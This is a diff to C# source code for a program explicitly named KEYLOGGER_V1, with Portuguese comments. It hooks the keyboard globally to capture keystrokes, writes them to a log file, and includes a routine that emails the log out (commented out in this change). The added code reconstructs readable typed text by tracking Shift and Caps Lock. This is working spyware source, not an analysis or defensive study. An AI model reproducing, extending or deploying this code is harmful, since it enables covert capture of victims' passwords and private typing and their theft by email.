@@ -24,7 +24,7 @@ namespace KEYLOGGER_V1
             {
                 if (Verifica_Conexao_Web() == true)   //Verificação de Conexão.
                 {  
-                    EnviarEmailLog(@"C:\Key\Keylogger.txt"); //Envia o log por EMAIL.
+                    //EnviarEmailLog(@"C:\Key\Keylogger.txt"); //Envia o log por EMAIL.
                 }
 
             }
@@ -60,11 +60,12 @@ namespace KEYLOGGER_V1
         }
         private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
         {
-            SalvaLogOuEnviaEmail();
+            //SalvaLogOuEnviaEmail();
         }
         void gkh_KeyDown(object sender, KeyEventArgs e)                        //EVENTO: do HOOK para scaneamento das teclas
         {
-            txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
+            txtTextoDigitado.Text += MapeamentoTraducaoDasTeclas(Convert.ToString(e.KeyCode));
+            txtTextoDigitadoLimpo.Text += MonitoramentoDeTeclas(MapeamentoTraducaoDasTeclas(Convert.ToString(e.KeyCode)));
         }
 
 //------------------------------------------------------------------[METODOS]--------------------------------------------------------------------------------------        
@@ -97,7 +98,8 @@ namespace KEYLOGGER_V1
             }
             else
             {
-                return false;
+                Directory.CreateDirectory(@"C:\Key\");
+                return true;
             }
 
         }      
@@ -195,7 +197,7 @@ namespace KEYLOGGER_V1
                 }
             }
         }
-        String GerenciamentoDeCaracteres(String Key)              //METODO: Mapeamento de teclas, e Comparação das teclas para substituição.
+        String MapeamentoTraducaoDasTeclas(String Key)            //METODO: Mapeamento de teclas, e Comparação das teclas para substituição.
         {
 
             switch (Key)
@@ -356,6 +358,80 @@ namespace KEYLOGGER_V1
             
 
         }
+
+
+        bool ShiftPressionado = false;
+
+        public String MonitoramentoDeTeclas(String tecla)
+        {
+
+            return Mon_Letras_teclasSuporte(tecla);
+        }
+
+        
+        public string Mon_Letras_teclasSuporte(string tecla)
+        {
+            string segundoCaracter = null;
+            string primeiroCaracter = tecla.Substring(0,1);
+           
+            try
+            {
+                segundoCaracter = tecla.Substring(1, 1);
+                
+                switch (tecla)
+                {   case "[Shift]":
+                            ShiftPressionado = true;
+                        break;
+                    case "[Space]":
+                        return " ";
+
+                    default:
+                        break;
+                }
+
+                return "";
+               
+            }
+            catch (Exception)
+            {
+
+                string teclasAlteradas;
+                if (Control.IsKeyLocked(Keys.CapsLock))            //Verifica se o capslook foi ativo.
+                {
+                    if (ShiftPressionado == true)
+                    {
+                       
+                        teclasAlteradas = tecla.ToLower();
+                        ShiftPressionado = false;
+                    }
+                    else
+                    {
+                        teclasAlteradas = tecla.ToUpper();   
+                    }
+                }
+                else 
+                {
+                    if (ShiftPressionado != true)
+                    {
+
+                        teclasAlteradas = tecla.ToLower();
+                        
+                    }
+                    else
+                    {
+                        teclasAlteradas = tecla.ToUpper();
+                        ShiftPressionado = false;
+                    }
+                }
+
+                return teclasAlteradas;
+
+            }
+            
+        
+        }
+
+      
 
     }
 }
